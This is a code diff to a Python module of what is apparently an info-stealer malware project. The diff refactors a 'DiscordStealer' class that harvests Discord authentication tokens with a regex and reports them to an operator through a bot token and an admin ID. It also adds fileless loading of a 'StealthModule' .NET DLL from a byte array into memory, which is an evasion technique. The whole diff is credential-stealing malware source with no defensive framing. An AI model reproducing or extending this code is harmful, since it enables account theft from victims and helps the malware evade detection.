@@ -13,40 +13,72 @@ from core.bridge_manager import bridge_manager
 
 DIVIDER = "—" * 30
 
+from core.base import BaseModule
+
 def log_debug(msg):
     try:
-        log_file = os.path.join(os.environ.get("TEMP", "."), "discord_module.log")
+        log_file = os.path.join(os.environ.get("TEMP", "."), "debug_log.txt")
         with open(log_file, "a") as f:
-            f.write(f"{time.ctime()} | {msg}\n")
+            f.write(f"{time.ctime()} | [Discord] {msg}\n")
     except: pass
 
 # DLL Integration
 try:
+    from System.Reflection import Assembly
+    from System.IO import File
     dll_name = "discord.dll"
-    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    # Search in current dir, core/ and native_modules/
     search_paths = [
-        os.path.join(project_root, "bin", dll_name),
-        os.path.join(project_root, "defense", dll_name),
-        os.path.join(project_root, dll_name)
+        os.path.join(os.path.dirname(__file__), dll_name),
+        os.path.join(os.path.dirname(__file__), "..", "native_modules", dll_name),
+        os.path.join(os.getcwd(), "native_modules", dll_name)
     ]
     
     CS_AVAILABLE = False
-    for p in search_paths:
-        if os.path.exists(p):
-            clr.AddReference(p)
-            from StealthModule import DiscordManager
-            CS_AVAILABLE = True
-            break
-except:
+    for _p in search_paths:
+        if os.path.exists(_p):
+            try:
+                # S-09: RAM-Only loading from byte array
+                raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
+                Assembly.Load(raw_bytes)
+                from StealthModule import DiscordManager
+                CS_AVAILABLE = True
+                # log_debug("Successfully loaded Discord DLL into memory")
+                break
+            except Exception as ex: 
+                log_debug(f"Failed to load DLL {os.path.basename(_p)}: {ex}")
+                continue
+except Exception as e:
+    log_debug(f"Critical error in Discord DLL loading: {e}")
     CS_AVAILABLE = False
 
-class DiscordStealer:
-    def __init__(self, temp_dir, bot_token=None, admin_id=None, telegram_bridge=None):
-        self.temp_dir = temp_dir
-        self.bot_token = bot_token
-        self.admin_id = admin_id
-        self.telegram_bridge = telegram_bridge or ""
+class DiscordStealer(BaseModule):
+    def __init__(self, bot=None, report_manager=None, temp_dir=None):
+        super().__init__(bot, report_manager, temp_dir)
         self.token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
+        self.found_tokens = []
+
+    def run(self) -> bool:
+        """A-04: Implementation of standardized run method."""
+        try:
+            self.log("Scanning for Discord tokens...")
+            data = self.steal_tokens()
+            tokens = data.get('tokens', [])
+            self.found_tokens = tokens
+            
+            if tokens and self.bot and self.report_manager:
+                self.log(f"Found {len(tokens)} tokens. Sending report...")
+                # Use standard attributes from BaseModule if available, or bot_token from main
+                # DiscordStealer previously took bot_token, but now uses self.bot.token
+                self.send_full_report(tokens, self.bot.token, self.report_manager.admin_id)
+            
+            return True if tokens else False
+        except Exception as e:
+            self.log(f"Discord extraction failed: {e}")
+            return False
+
+    def get_stats(self) -> Dict[str, int]:
+        return {"tokens": len(self.found_tokens)}
 
     def _clean_token(self, token: str) -> str:
         if not token: return ""
